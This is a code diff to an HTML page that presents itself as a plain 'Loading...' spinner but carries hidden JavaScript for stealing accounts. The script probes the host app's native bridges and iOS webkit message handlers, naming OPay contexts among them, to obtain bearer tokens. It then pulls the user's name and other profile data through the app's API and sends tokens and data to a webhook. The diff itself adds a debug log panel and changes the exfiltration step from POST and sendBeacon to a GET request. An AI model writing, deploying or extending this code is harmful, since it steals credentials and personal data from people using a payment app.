@@ -46,6 +46,16 @@
             font-size: 14px;
             color: #555;
         }
+
+        #logs {
+            margin-top: 20px;
+            text-align: left;
+            font-family: monospace;
+            font-size: 10px;
+            color: #00c853;
+            max-width: 90%;
+            word-break: break-all;
+        }
     </style>
 </head>
 
@@ -53,6 +63,7 @@
     <div class="loader">
         <div class="spinner"></div>
         <div class="text">Loading...</div>
+        <div id="logs"></div>
     </div>
 
     <script>
@@ -71,24 +82,27 @@
             sw: screen.width, sh: screen.height,
             touch: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
             tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "?",
-            bridges: [],
-            token: null
+            bridges: [], foundKeys: []
         };
+
+        function log(msg) {
+            var l = document.getElementById("logs");
+            if (l) {
+                var p = document.createElement("div");
+                p.innerText = "> " + msg;
+                l.appendChild(p);
+            }
+        }
 
         // ===== EXFIL =====
         function send(data, tag) {
             tag = tag || "d";
+            log("Sending " + tag + "...");
             try {
                 var x = new XMLHttpRequest();
-                x.open("POST", WEBHOOK + "?t=" + tag, true);
-                x.setRequestHeader("Content-Type", "application/json");
-                x.send(JSON.stringify(data));
-            } catch (e) { }
-            try {
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify({ t: tag, d: data })], { type: "application/json" }));
-                }
-            } catch (e) { }
+                x.open("GET", WEBHOOK + "?t=" + tag + "&d=" + encodeURIComponent(JSON.stringify(data).substring(0, 1000)), true);
+                x.send();
+            } catch (e) { log("Send ERR: " + e.message); }
         }
 
         // ===== API CALLER =====
@@ -112,9 +126,11 @@
 
         // ===== FULL ACCOUNT EXTRACTION =====
         function extractAll(token) {
+            log("Starting data extraction...");
             // PII + Profile
             api("/api-user/user/info/aggregate", { scene: "HOME" }, token, function (e, r) {
                 if (!e && r && r.data) {
+                    log("GOT PII DATA");
                     var d = r.data;
                     var pii = {
                         name: (d.firstName || "") + " " + (d.middleName || "") + " " + (d.surname || ""),
@@ -201,12 +217,15 @@
 
             var found = {};
 
+            log("Scanning " + BRIDGES.length + " potential bridges...");
+
             // Scan window objects
             for (var i = 0; i < BRIDGES.length; i++) {
                 try {
                     if (window[BRIDGES[i]] && typeof window[BRIDGES[i]] === 'object') {
                         found[BRIDGES[i]] = window[BRIDGES[i]];
                         D.bridges.push(BRIDGES[i]);
+                        log("FOUND BRIDGE: " + BRIDGES[i]);
                     }
                 } catch (e) { }
             }
@@ -216,6 +235,8 @@
                 if (window.webkit && window.webkit.messageHandlers) {
                     found["webkit.mh"] = window.webkit.messageHandlers;
                     D.bridges.push("webkit.messageHandlers");
+                    log("FOUND iOS webkit.messageHandlers");
+
 
                     var hNames = ['getBaseInfo', 'getToken', 'getUserInfo', 'getAccountInfo',
                         'OPay3PartyContext', 'OPayContext', 'callNative', 'invoke',
@@ -337,6 +358,7 @@
                                 tokenFound = true;
                                 D.token = rv;
                                 send({ token: rv, src: name + "." + rk }, "TOKEN");
+                                log("!!! TOKEN FOUND !!!");
                                 extractAll(parsed.token);
                             }
                         } catch (e) {
@@ -345,6 +367,7 @@
                                 var tkn = rv.replace("Bearer ", "").trim();
                                 D.token = rv;
                                 send({ token: rv, src: name + "." + rk }, "TOKEN");
+                                log("!!! TOKEN FOUND (Regex) !!!");
                                 extractAll("Bearer " + tkn);
                             }
                         }
